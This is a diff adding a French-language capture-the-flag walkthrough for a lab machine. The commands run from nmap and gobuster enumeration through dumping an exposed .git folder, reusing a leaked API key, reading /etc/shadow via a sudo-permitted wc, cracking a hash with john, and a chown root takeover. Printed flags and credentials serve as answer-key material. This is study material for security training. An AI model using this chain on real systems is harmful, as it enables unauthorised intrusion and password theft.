@@ -1,0 +1,87 @@
+
+ip machine a attaqueé : 10.10.244.145
+
+ping 10.10.244.145
+=> notre vm connecté a celle a attaqué
+
+nmap -vv 10.10.244.145 -p-
+=> regarder quelles port ouvert
+=> 22, 80, 8081
+
+gobuster dir -u http://10.10.244.145:8081 -w Desktop/wordlists/dirb/common.txt
+=> vérifier les redirection de la page internet
+=> lost -> nous dit d'aller en 8081
+
+gobuster dir -u http://10.10.244.145 -w Desktop/wordlists/dirb/common.txt
+=> nothing
+
+http://10.10.244.145:8081
+=> page de login injection possible
+
+dirb http://[notre_ip]:8081 tools/wordlits/dirb/big.txt
+=>lost
+
+dirb http://[notre_ip]:8081/lost tools/wordlits/dirb/big.txt
+=>.git
+
+wget --recursive http://[notre_ip]:80/lost/.git -q
+
+git log
+
+git log -p -2 > log.txt
+
+cat log.txt
+=> 57db5c001c802fc4be25afb02cff9bf8
+
+activer extension mozilla burp
+ouvrir burp -> proxy
+lancer commande dans page lost
+changer key NUll par key : 57db5c001c802fc4be25afb02cff9bf8
+clique droit -> send to repeater -> reapeter
+
+essayer 
+POST /api/zoro HTTP/1.1
+POST /api/luffy HTTP/1.1
+POST /api/naruto HTTP/1.
+
+{"username":"naruto","password":"WhatAmIDoingHere?"}
+{"username":"luffy","password":"ThisIsNotMyPassword"}
+{"username":"zoro","password":"1_G07_L0S7_0Nc3_4G41n"}
+
+conexion ssh en tant que zoro
+cat user.txt
+=>EPI{1f_1_91V3_uP_noW_1M_9o1N9_7O_r39R37_17}
+
+sudo -l
+zoro a droit root sur /usr/bin/wc
+
+sudo  /usr/bin/wc --files0-from /etc/shadow
+=>luffy:$6$Qin3OaoK$zPDgzM0Fxptmoe6jPgGI.MpAV4cnZOBY6yVq6IQ9TiGVAXt4O04Vi9pmF.PBJDsTzFxAzQZW5S3tyyw0xa.ji/
+
+tu recupere la ligne luffy dans le /etc/passwd
+et tu la met dans un fichier passwd.txt
+ensuite tu recupere la ligne de luffy dans le etc/shadow
+et tu le met dans un fichier genre shadow.txt
+ensuite tu utilise unshadow
+unshadow passwd.txt shadow.txt > unshadow.txt
+sa ve juste reunir les deux dans le bon ordre dans le fichier unshadow.txt
+et apres tu fais un john avec rockyou sur unshadow.txt
+
+mdp de luffy : ONEPIECE
+
+su luffy
+=> become luffy
+
+aller sur : https://gtfobins.github.io/gtfobins/chown/
+
+sudo chown $(id -un):$(id -gn) /root
+-> diminuer les droits de root pour que on puisse y avoir acces
+
+cd /root
+
+ls
+->thisIsATreasureDidYouEpectRootDotTXT.txt
+
+cat ->thisIsATreasureDidYouEpectRootDotTXT.txt
+-> EPI{r_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}
+
